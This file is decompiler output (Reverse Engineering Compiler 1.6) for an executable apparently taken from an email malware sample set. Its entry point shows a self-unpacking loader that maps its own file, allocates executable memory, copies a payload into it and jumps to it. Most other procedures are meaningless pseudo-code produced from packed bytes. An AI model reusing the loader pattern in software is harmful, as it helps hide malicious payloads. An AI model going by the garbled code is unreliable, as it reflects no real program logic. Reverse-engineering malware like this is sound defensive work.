/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0472/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 13101b24 -> 13101aeb */
/*	Procedure: 0x13101AFF - 0x13101C4F
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L13101AFF()
{



    al = al ^ 121;
    (restore)es;
    esi = esi ^ *(edi - 100);
    cl = 125;
    asm("xchg eax,ebp");
    asm("adc al,0xb4");
    asm("sbb dword [ebp+0xb62c0010],0x80180016");
    *eax = *eax + al;
    *(edx + -1442797826) = *(edx + -1442797826) + ch;
    al = al + bl;
    *eax = *eax + al;
    if(al = al + al) {
        goto L13101aeb;
    }
    *(eax + -263655979) = *(eax + -263655979) | dh;
    asm("rep lock ja 0x13101aed");
    asm("in al,0x83");
    39 = *(ebp + ebp * 8 - 12) * ebp;
    asm("out 0x0,al");
    *(ebx + 16) & ecx;
    edi = edi - 1;
    ebp = *(ebx + -1015303440);
    asm("cld");
    return(123);
    asm("xchg eax,esp");
    asm("scasd");
L13101b49:
    asm("xchg eax,edi");
    asm("rep inc esp");
    asm("lock or eax,0xcea4cb77");
    *edi = eax;
    asm("adc eax,[eax+0x10]");
    asm("adc [ecx],dl");
L13101b59:
    if(!(edi = edi + 4)) {
    }
    *eax = *eax + al;
    asm("adc eax,eax");
L13101b61:
    if(*(ebp - 2) = *(ebp - 2) + dl) {
        goto L13101b49;
    }
    *edi = eax;
    edi = edi + 4;
    return;
    asm("les ecx,[esp+ecx*8+0x4c]");
    asm("int3");
    al = al ^ 180;
L13101b6f:
    if(esp = esp + 1) {
        goto L13101b59;
    }
    asm("Unknown opcode 0xd3");
    > ? L13101bd1 : ;
    >= ? L13101b32 : ;
    al = al | dl;
L13101b79:
    (save)-3;
    asm("o16 add [eax+0x34],ch");
    asm("int1");
    asm("rep lock jnz 0x13101b41");
    asm("clc");
    cl = 145;
    asm("in eax,dx");
    asm("cld");
    asm("lock out dx,eax");
    *(ebp + 228970000) = esi;
    asm("hlt");
    asm("adc [eax],dl");
    asm("adc edi,[ebp+0x40]");
    eax = *eax();
    ebp & eax;
    asm("adc al,dl");
    (save)esi;
    if(*edx = *edx + ebx) {
        goto L13101b61;
    }
    asm("cld");
    cl = 133;
    asm("lodsd");
    asm("adc [edi],cl");
    if(*(edx + -267848231) = *(edx + -267848231) | dh) {
        goto L13101b6f;
    }
    asm("clc");
    ch = ch >> 1;
    asm("adc eax,0x13101004");
    (restore)ebx;
    asm("%d or al,0x0");
    al = al ^ 180 ^ 180;
    al :: 188;
    al :: 188;
    esp = esp + 1;
    asm("les eax,[esp+eax*8+0x4c]");
    asm("int3");
    asm("int3");
    al = al ^ 180;
    if(esp = esp - 1) {
        goto L13101b79;
    }
    asm("Unknown opcode 0xd3");
    > ? L13101bf1 : ;
    asm("sbb ah,bh");
    *eax = *eax + eax;
    *(eax + -317673456) = *(eax + -317673456) + ch;
    (restore)eax;
    asm("insb");
    asm("int1");
    asm("lock out dx,eax");
    ebp = ebp - 1;
    asm("cmc");
    al = al - dh;
    asm("rep lock call 0x21010b4b");
    (restore)eax;
    asm("adc [eax+0x10],dh");
    asm("Unknown opcode 0x0f");
    asm("insd");
    asm("adc eax,0x13101024");
    eax = -317657072;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    asm("Unknown opcode 0xc1");
    (al ^ 188) :: 188;
    (al ^ 188) :: 196;
    esp = esp + 1;
    asm("les eax,[esp+ecx*8+0x4c]");
    asm("int3");
    ah = 52;
    if(!(esp = esp - 1)) {
        (save)ebx;
        > ? L13101bb1 : ;
        *(52 + ecx + 4194344) = 0;
        asm("adc al,dh");
        asm("rep fmul dword [ecx+0xe6d14fcc]");
        *(ebp + -1926211517) = *(ebp + -1926211517) + al;
        esp = esp ^ *(edi + ecx * 2 - 40);
        *(al + al) = *(al + al) + al + al;
        (save)219164672;
    }
    (save)-2097053808;
    al = 152;
    asm("xchg cl,[eax+0x9d858f0d]");
    bl = 195;
    esp = esp - 1;
    asm("int3");
    esp = esp - 1;
    asm("int3");
    al = al ^ 180;
}

/* DEST BLOCK NOT FOUND: 13101cdb -> 13101bb1 */
/* DEST BLOCK NOT FOUND: 13101e2d -> f06bf260 */
stack space not deallocated on return
/*	Procedure: 0x13101C50 - 0x13101EE3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)ebp;
    (save)ebx;
    (save)esi;
    (save)edi;
    ebp = esp;
    esp = esp - 400;
    (save)388;
    ebx = ebp - 388;
    (save)ebx;
    (save)0;
    *__imp__GetModuleFileNameW();
    (save)0;
    (save)128;
    (save)3;
    (save)0;
    (save)0;
    (save)-2147483648;
    (save)ebx;
    eax = *__imp__CreateFileW();
    (save)eax;
    (save)0;
    (save)0;
    (save)0;
    (save)2;
    (save)0;
    (save)eax;
    eax = *__imp__CreateFileMappingW();
    (save)eax;
    (save)0;
    (save)0;
    (save)0;
    (save)4;
    (save)eax;
    eax = *__imp__MapViewOfFile();
    (save)eax;
    edi = eax + 23552;
    (save)64;
    (save)4096;
    (save)3317;
    (save)0;
    *__imp__VirtualAlloc();
    esi = eax;
    asm("xchg edi,esi");
    asm("cld");
    ecx = 3317;
    asm("rep movsb");
    goto ( *eax);
    edx = 1974649665;
    eax = eax & 76;
    asm("iret");
L13101ce6:
    (save)ecx;
    *(eax - 125) = *(eax - 125) ^ ch;
    (restore)ebx;
    *(ebp - 119) = (frestore);
    asm("jpo 0x13101cb0");
    (save)-25;
    1978889920 = *(edi - 85) * edi;
L13101cf8:
    *ecx = *ecx + cl;
    *ecx & ah;
    *eax = *eax + eax;
    asm("sldt [ebx]");
    if(*(ecx + -1928936379) = *(ecx + -1928936379) + al) {
        goto L13101cf8;
    }
    *eax = *eax + 1;
    asm("jpo 0x13101d91");
    if(!( *(eax + 508) = *(eax + 508) + ch)) {
        cl = 51;
        edi = edi - 1;
        al & 148;
        asm("adc [eax],edx");
        asm("adc eax,ecx");
        asm("in eax,dx");
        asm("sbb al,dh");
        asm("lock out dx,eax");
        (restore)eax;
        asm("out dx,eax");
        asm("lock int1");
        *(ebx - 112) & esi;
        asm("fcomp dword [edi-0x1f]");
        asm("into");
        asm("in eax,0xd");
        asm("sbb al,0x10");
        asm("adc [ebx],dl");
        *(ebp - 24) :: 117;
L13101d39:
        asm("stc");
        asm("jpo 0x13101d8d");
        esi = ebx + 80;
    }
    *(edi + -183684855) = *(edi + -183684855) | al;
    asm("in al,0xf0");
    asm("rep lock test al,0x5c");
    asm("out dx,eax");
    asm("lock or eax,0x28708b75");
    *edi = eax;
    edi = edi + 4;
    eax = eax - -468897454;
    asm("adc [eax],dl");
    (save)gs;
    if(*(al + 255) = *(al + 255) + al + 255) {
        goto L13101ce6;
    }
    *(edi - 49) = al;
    (save)ecx;
    al = al ^ ch;
    asm("pushf");
    asm("out dx,eax");
    asm("lock int1");
    asm("Unknown opcode 0xdf");
    ebx = ebx | *eax;
    asm("adc [eax],dl");
    if(eax = eax | 269590616) {
        goto L9109d602;
    }
    goto ( *edi);
    asm("aam 0xf0");
    asm("lock int1");
    if(!(ebp = ebp + ebx)) {
        *(ebx + -1951491817) = *(ebx + -1951491817) - dl;
        *(eax + 41) & ebp;
        *edi = *esi;
        edi = edi + 4;
        esi = esi + 4;
        asm("daa");
        (save)eax;
        edx = edx - *ebx;
        asm("fcom qword [eax]");
        asm("adc [ecx],dl");
        al & 124;
        asm("adc [eax],edx");
        asm("adc esi,[ebx+0x75]");
        *(ecx - 55) = cl;
        ebx = ebx - 1;
        asm("das");
        goto L13101dcc;
        asm("lock in eax,dx");
        asm("xchg esi,[ebx+0x44]");
        asm("out 0x63,al");
        asm("in eax,0xd2");
        if(edi = edi - 1) {
            goto L13101d39;
        }
        *(edx - 15) = *(edx - 15) >> 115;
        (save)eax;
        *(ebx + 25163952) & ecx;
        *eax = *eax ^ ebx;
        asm("retf");
        ecx = ecx | *(ebx + 205554957);
        asm("clc");
        *(ebx + 80) & esi;
L13101dcc:
        asm("sbb [edi+0x7d734e21],bl");
        asm("sbb [ebp+0x28d0af2d],ch");
        al = al + *eax;
        *(eax + -1018982616) = *(eax + -1018982616) + al;
        asm("jpo 0x13101e5e");
        asm("les ecx,[edx-0x31]");
        (save)ecx;
        *(ecx + 1574322285) = *(ecx + 1574322285) ^ ecx;
        asm("Unknown opcode 0xdf");
        asm("into");
        if(ebp = ebp + 1) {
            goto L13101e6c;
        }
        al & 103;
    }
    goto L13101e62;
    *(eax + 116) & eax;
    eax = L9a589178(2046260221, eax);
    ecx = ecx | *(ebp + -1469217871);
    asm("adc eax,0xa8321b99");
    *eax = *eax + 1;
    *(eax + 799787416) = *(eax + 799787416) + al;
    cl = 135;
    asm("jpo 0x13101e5a");
    dh = 59;
    ebp = -862594864;
    edi = edi + 1;
    (restore)ebp;
    (restore)eax;
    (fsave)(frestore) * *(ebp - 47);
    (save)ebx;
    Lf06bf260();
    goto L00001010;
    asm("adc [ebx+0x10],ebx");
    eax = L1310e45c();
    asm("std");
    asm("adc eax,0xf3f0f094");
    asm("sbb [ecx+0x87118f0b],bh");
    return;
    asm("xchg eax,esp");
    asm("int 0xcd");
    *ecx = *ecx - cl;
    *eax = *eax + al;
L13101e50:
    *(ebx + 35) = *(ebx + 35) + bh;
    ebp = ebp - 1;
    ecx = ecx + 1;
    esp = -1002126268;
    asm("cmc");
    eax = eax | -269471744;
    asm("retf");
    edi = edi + *esi;
L13101e62:
    *eax = *eax + al;
    asm("fsincos");
    *eax = *eax + al;
L13101e6c:
    asm("int3");
    al = al ^ 119;
    asm("%g dec ebp");
    if(*(esp + ecx * 8 + 76) = *(esp + ecx * 8 + 76) + cl) {
        goto L13101e50;
    }
    > ? L13101e52 : ;
    bh :: 0;
L13101e77:
    asm("rcr dword [edi+0xeff07218],1");
    if(*eax = *eax + al) {
        goto L13101e77;
    }
    asm("hlt");
    asm("Unknown opcode 0x8e");
    asm("rep lock xchg ebp,ebp");
    asm("lock xchg eax,edx");
    asm("lock out dx,eax");
    asm("xchg edi,ebp");
    asm("hlt");
    asm("scasb");
    asm("adc [ebx],dl");
    > ? L13101e89 : ;
    asm("clc");
    dl = 16;
    > ? L23be2392 : ;
    asm("adc ebx,[edx+0x74]");
    goto L13101eb2;
L13101ea2:
    esi = esi - 1;
    asm("lock int1");
    asm("out 0x84,al");
    eax = eax + -269430244;
    *ebx = es;
    *(edx + 16) = *(edx + 16) + dh;
L13101eb2:
    asm("int1");
    asm("adc [ebx],dl");
    asm("bound ecx,[ebx+0xf1f08f78]");
    (save)ds;
    if(eax = eax | -200966942) {
        goto L13101ea2;
    }
    asm("adc al,0x11");
    asm("lock out dx,eax");
    == ? L13101e51 : ;
    ebp = ebp + eax;
    asm("xchg eax,edx");
    asm("lock or eax,0x7bfcbb77");
    eax :: -62946556;
    asm("xchg eax,[0x13102eec]");
    asm("popf");
    dl :: 0;
    asm("lock in eax,dx");
}

/*	Procedure: 0x13101EE4 - 0x13101F87
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L13101EE4()
{



    ebx = ebx + *(eax - 49);
    asm("lock int1");
    *eax = *eax + eax;
    *eax = *eax + eax;
    esi = ebx + 1815706108;
    asm("lahf");
    al = al & 113;
    asm("adc [edi],cl");
    asm("lahf");
    al = al + dh;
    asm("adc [ecx],dl");
    eax = eax ^ *(ecx + 249885561);
    asm("lock int1");
    edi = edi + 1;
    asm("sti");
    asm("clc");
    asm("Unknown opcode 0x0f");
    asm("lock in eax,dx");
    *(eax + eax) = *(eax + eax) | eax;
    *(ebx + -1324554889) = *(ebx + -1324554889) >> 16;
    asm("adc eax,[edi+0x461b4bd]");
    al = 16;
    asm("adc esi,[edi-0x43]");
    asm("Unknown opcode 0xc4");
    (fsave)(frestore) + *eax;
    ebx = ebx - 1;
    asm("rep test al,dh");
    asm("lock int1");
    L070110f2();
    asm("loope 0x13101f3d");
    asm("adc byte [eax],0x10");
    asm("Unknown opcode 0x0f");
    (restore)eax;
    asm("stc");
    asm("cld");
    al = al + al;
    *(ebx + 25164896) = edi;
    ebx = ebx - 4;
    asm("lock int1");
    *ecx = *ecx ^ dl;
    asm("in eax,dx");
    asm("cwde");
    asm("lock out dx,eax");
    ebp = 884227529;
    ah = 60;
    esp = 278193453;
    asm("adc [ebx],dl");
    esp = esp - 1;
    asm("int3");
    esp = esp - 1;
    asm("int3");
    al = al ^ 180;
    ebp = ebp + 1;
    asm("sbb eax,0xf3f0f074");
    esp = esp + 1;
    asm("les eax,[esp+eax*8+0x4c]");
    asm("int3");
    (restore)ebp;
    eax = eax & 0x13101088;
    al :: 188;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* address  size  */
/* 0x13101014       0 */ /* unknown */ void 	__imp__CreateFileMappingW;
/* 0x13101018       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x1310101c       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x13101020       0 */ /* unknown */ void 	__imp__GetModuleFileNameW;
/* 0x13101024       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x13101028       0 */ /* unknown */ void 	__imp__CreateFileW;
/* 0x1310102c       0 */ /* unknown */ void 	__imp__MapViewOfFile;
/* 0x13101c50       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
